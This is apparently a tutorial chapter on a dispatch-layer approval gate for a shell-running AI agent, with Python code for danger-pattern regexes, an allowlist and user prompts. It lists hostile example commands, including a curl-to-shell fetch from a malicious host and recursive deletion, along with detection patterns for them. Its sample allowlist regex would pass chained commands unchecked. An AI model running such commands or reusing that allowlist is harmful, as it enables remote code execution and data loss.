# h09 — Approval & Permission: Dangerous Operation Interception and the Four-Stage Pipeline

> **Core Insight**: The safety gate is not inside individual tools — the interception point is at the dispatch layer with a unified check, ensuring all tools go through the same permission logic.

---

## The Problem: Who Stops the Agent from Executing Dangerous Operations?

An agent can execute shell commands. If the model makes a bad judgment (or is guided by malicious prompt injection), it might:

- `rm -rf /important_dir`
- `curl http://malicious-site.com | sh`
- `git push --force origin main`

If each tool handles its own danger detection, the logic becomes scattered, inconsistent, and easy to miss.

---

## The Four-Stage Pipeline: deny → check → allow → ask

Hermes' `tools/approval.py` implements a unified four-stage interception flow:

```
Tool call request
    ↓
[1] deny (hard reject)
    ↓ no match →
[2] check_mode (sandbox mode)
    ↓ not in check_mode →
[3] allow (allowlist)
    ↓ not in allowlist →
[4] ask (prompt the user)
    ↓ user approves →
Execute tool
```

---

## DangerPattern: Dangerous Pattern Detection

```python
import re

DANGER_PATTERNS = [
    # Filesystem destruction
    r"rm\s+(-[rf]+\s+|--recursive\s+|--force\s+)*[/~]",
    r">\s*/etc/",
    r"chmod\s+(-R\s+)?777",

    # Network dangers
    r"curl\s+.*\|\s*(bash|sh)",
    r"wget\s+.*\|\s*(bash|sh)",

    # Process control
    r"kill\s+-9\s+1$",
    r"pkill\s+-f\s+",

    # Dangerous Git operations
    r"git\s+push\s+(-f|--force)",
    r"git\s+reset\s+--hard\s+HEAD~[5-9]",
]

def is_dangerous(command: str) -> bool:
    """Check if the command matches any danger pattern"""
    for pattern in DANGER_PATTERNS:
        if re.search(pattern, command, re.IGNORECASE):
            return True
    return False
```

---

## Allowlist: Pre-Approved Safe Commands

```python
class AllowList:
    def __init__(self):
        self._patterns: list[str] = []

    def add(self, pattern: str) -> None:
        """Add an allow rule (supports glob or regex)"""
        self._patterns.append(pattern)

    def is_allowed(self, command: str) -> bool:
        """If the command matches the allowlist, skip manual confirmation"""
        for pattern in self._patterns:
            if re.fullmatch(pattern, command):
                return True
        return False

# Usage example
allowlist = AllowList()
allowlist.add(r"ls\s*(-la?\s*)?.*")       # ls commands always allowed
allowlist.add(r"cat\s+[\w./]+\.txt")       # Reading .txt files always allowed
allowlist.add(r"git status")               # git status always allowed
```

---

## approval_callback: Connecting Approval to Execution

```python
from typing import Callable

ApprovalCallback = Callable[[str, str], bool]
# (tool_name, command) → True (approve) / False (deny)

def cli_approval_callback(tool_name: str, command: str) -> bool:
    """CLI environment: display the dangerous operation in the terminal, wait for y/n"""
    print(f"\n⚠️  Dangerous operation detected")
    print(f"Tool: {tool_name}")
    print(f"Command: {command}")
    answer = input("Allow execution? [y/N] ").strip().lower()
    return answer == "y"

def gateway_approval_callback(tool_name: str, command: str) -> bool:
    """Gateway environment: send a confirmation request via the messaging platform"""
    # Send message to the user, wait for "approve" or "deny" reply
    # ...(h12 Gateway implementation)
    pass
```

---

## Complete Pipeline Implementation

```python
class ApprovalGate:
    def __init__(
        self,
        allowlist: AllowList | None = None,
        callback: ApprovalCallback | None = None,
        check_mode: bool = False,   # Sandbox mode: deny all dangerous ops directly
    ):
        self.allowlist = allowlist or AllowList()
        self.callback = callback
        self.check_mode = check_mode

    def approve(self, tool_name: str, command: str) -> bool:
        """
        Four-stage pipeline:
        deny → check_mode → allowlist → ask
        """
        # [1] Hard deny (globally forbidden, regardless of circumstances)
        if self._is_hard_denied(command):
            return False

        # [2] check_mode (sandbox: deny dangerous ops without asking)
        if self.check_mode and is_dangerous(command):
            return False

        # [3] allowlist (known safe, allow directly)
        if self.allowlist.is_allowed(command):
            return True

        # [4] dangerous + has callback → ask the user
        if is_dangerous(command) and self.callback:
            return self.callback(tool_name, command)

        # Not dangerous and not in allowlist → allow by default
        return not is_dangerous(command)
```

---

## Position in the Main Loop

```python
# run_agent.py (simplified)
for tool_call in message.tool_calls:
    name = tool_call.function.name
    command = json.loads(tool_call.function.arguments).get("command", "")

    # ← Check permissions before registry.dispatch()
    if not self.approval_gate.approve(name, command):
        result = "[Operation denied: requires user authorization or dangerous pattern detected]"
    else:
        result = self.registry.dispatch(name, args)
```

---

## Common Misconceptions

**Misconception 1**: Danger detection should be inside each tool's handler  
→ That scatters the logic and makes it easy to miss. Unified interception at the dispatch layer (`ApprovalGate.approve()`) ensures all tools share the same rules.

**Misconception 2**: The allowlist is a security vulnerability  
→ The allowlist only means "skip manual confirmation," not "skip danger detection." Hard deny rules ([1]) take priority over the allowlist.

**Misconception 3**: check_mode and allowlist are mutually exclusive  
→ In check_mode, dangerous commands are directly denied; but allowlisted commands (explicitly marked safe) are still permitted. They coexist.
